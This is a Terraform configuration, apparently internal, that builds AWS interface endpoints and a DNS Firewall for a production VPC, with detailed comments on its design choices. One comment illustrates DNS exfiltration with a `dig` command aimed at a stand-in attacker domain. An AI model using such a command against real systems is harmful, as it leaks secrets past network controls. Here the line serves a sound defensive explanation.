# production/workloads-egress/ - VPC-Workloads' [E] endpoint slice (Stage 6c step 1.3a): the
# interface endpoints a Production job calls, and the DNS Firewall (Stage 9 step 3.3a).
#
# There is no NAT gateway here, and none anywhere in the estate: under D38 a spoke reaches the
# internet as a client of the explicit proxy in VPC-Networking rather than through a route, and this
# VPC's plane (`production-workloads`) refuses everything by decision. An application image built
# `FROM base` carries no proxy variable and an isolated job container has no network at all, so a
# call with no endpoint here never comes back as a proxy 403: it fails at the firewall, in about 2 s
# (`errno 16`, 6i), and without the firewall it resolves and hangs.
#
# foundation/'s [P] facts arrive through terraform_remote_state - never pasted (Lesson 3). Here the
# state read is `workloads`, not `foundation`: this slice's VPC is VPC-Workloads.

data "terraform_remote_state" "workloads" {
  backend = "s3"

  config = {
    bucket = "awsds-${var.env}-tfstate"
    key    = "${var.account_folder}/workloads/terraform.tfstate"
    region = var.region
  }
}

module "egress" {
  # checkov:skip=CKV_TF_1:pinned by git TAG by convention (conventions §6, Stage 3 step 1.1a) - a repository-internal tag only the repo owner can move
  source = "git::git@github.com:felipenoris/AWS-DataScience.git//terraform-modules/vpc-egress?ref=vpc-egress-v0.17.0"

  env    = var.env
  vpc_id = data.terraform_remote_state.workloads.outputs.vpc_id

  name_suffix = "workloads"

  # No `egress_mode`, `nat_public_subnet_id` or `private_route_table_ids`: under D38 the estate has
  # one internet exit - an explicit proxy in the hub - and no VPC carries a default route, so there
  # is no mode to select and no route table for this slice to write to. What it builds is endpoints
  # and the DNS Firewall.
  endpoint_subnet_id         = data.terraform_remote_state.workloads.outputs.private_subnet_ids[var.zone_ids[0]]
  endpoint_security_group_id = data.terraform_remote_state.workloads.outputs.endpoints_security_group_id

  # The job-facing set of Stage 9 step 3.3a, at ~0.010/h each. `core_services` is overridden here and
  # in staging/egress/, which carries the same set (4.3a): the module's core eight are what a notebook
  # or a runner cannot work without, and neither VPC holds one. `sts`, `logs`, `kms` and `glue` stay. `ecr.api` and
  # `ecr.dkr` leave, because a SageMaker job pulls its image as its role through the service and
  # never through this VPC (step 3.1). `athena` leaves until a job here queries through it.
  #
  # `lakeformation` is here for decision 12 (a), taken 2026-10-22: a Glue job runs on the connection
  # production/sagemaker/ declares, inside this VPC, and vends its Lake Formation credentials from it;
  # the job's `vpcEndpointId` reading confirms it at step 2.4 (Stage 10 step 0.5). Stage 10 keeps its
  # `mwaa` group empty, and no optional group is wired until a workload here names one.
  #
  # Session Manager's three stay out: 6c step 5.5 asks for them in an instance-bearing spoke, and
  # this VPC holds no instance.
  core_services  = ["sts", "logs", "kms", "glue", "lakeformation"]
  extra_services = ["sagemaker.api", "secretsmanager"]

  # Per apply, from `make up ENV=production GROUPS=…` (variables.tf): `redshift` for a job that calls
  # the governed warehouse's API from inside this VPC (Stage 9 step 9.1), nothing otherwise.
  optional_service_groups = var.optional_service_groups

  # The firewall closes the VPC resolver as an exfiltration channel (6c step 5.7), which exists
  # wherever code runs, with or without a route: `dig secret-payload.evil.example` leaves through
  # the resolver one label at a time.
  dns_firewall = true

  # TRUST, as in the two other firewalled VPCs: every entry below is an AWS namespace, so AWS points
  # the chain beneath it.
  firewall_domain_redirection_action = "TRUST_REDIRECTION_DOMAIN"

  # AWS namespaces only (step 3.3a). Each of the seven endpoints answers for
  # `<service>.<region>.amazonaws.com` and its `.api.aws` twin, plus `streaming-logs` for `logs`
  # (measured on Sandbox's endpoints, 2026-09-09), and the S3 gateway's names are under
  # `amazonaws.com` too. The apex sits beside each wildcard because a domain-list wildcard never
  # matches the apex, and every entry carries the trailing dot of EXC-04's repair.
  #
  # The estate's private zones are not here, so `gitlab.awsds.internal`, `proxy.awsds.internal` and
  # every `prod.awsds.internal` name answer NXDOMAIN in this VPC: GitLab sits in VPC-SharedServices,
  # which this VPC has no peering to, and the proxy refuses this plane everything. A name a job
  # needs under `prod.awsds.internal` joins the list with it.
  #
  # The module names the query log group `/awsds/<env>/dns-firewall`, without the suffix;
  # production/egress carries no firewall, so the name is free in this account.
  dns_firewall_allow_domains = [
    "amazonaws.com.", "*.amazonaws.com.",
    "api.aws.", "*.api.aws.",
  ]
}
